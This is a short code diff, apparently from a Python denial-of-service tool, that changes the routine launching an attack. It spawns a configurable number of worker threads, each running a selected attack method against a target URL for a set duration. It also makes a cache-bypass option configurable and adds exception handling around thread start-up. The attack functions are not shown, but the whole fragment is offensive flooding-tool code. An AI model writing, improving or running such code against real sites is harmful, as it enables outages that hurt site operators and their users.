@@ -199,16 +199,23 @@ SOFTWARE.
     if not args['yes_to_all']:
         input('\n + Ready? (Press ENTER) ')
 
-    Core.bypass_cache = True
+    Core.bypass_cache = args['bypass_cache']
 
-    print(' + Launching attack.')
+    print('\n + Launching attack.')
     stoptime, threadbox = time.time() + args['duration'], []
     for _ in range(args["workers"]):
-        kaboom = threading.Thread(target=Core.methods.get(attack_method)['func'], args=(attack_id, args['target_url'], stoptime,))
+        try:
+            kaboom = threading.Thread(target=Core.methods.get(attack_method)['func'], args=(attack_id, args['target_url'], stoptime,))
+            threadbox.append(kaboom)
+            kaboom.start()
 
-        threadbox.append(kaboom)
-
-        kaboom.start()
+        except KeyboardInterrupt:
+            Core.attackrunning = False
+            Core.killattack = True
+            sys.exit('\n + Bye!\n')
+        
+        except Exception as e:
+            print(f' - Failed to launch thread: {str(e).rstrip()}')
     
     Core.attackrunning = True # all threads have launched, lets start the attack
 
